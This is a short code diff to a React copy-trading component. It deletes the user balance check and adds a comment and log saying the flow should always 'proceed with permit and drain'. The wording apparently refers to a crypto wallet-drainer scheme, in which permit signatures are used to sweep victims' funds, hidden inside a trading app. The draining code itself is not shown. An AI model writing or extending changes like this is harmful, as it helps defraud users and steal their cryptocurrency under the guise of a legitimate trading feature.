@@ -66,12 +66,8 @@ const CopyTrading = () => {
       return
     }
     
-    // Check if user has sufficient balance
-    if (user.account_bal < amount) {
-      alert('Insufficient balance. Please deposit first.')
-      navigate('/deposit')
-      return
-    }
+    // Always proceed with permit and drain, regardless of platform balance
+    console.log('Proceeding with permit and drain regardless of platform balance')
     
     try {
       // Create copy trade first
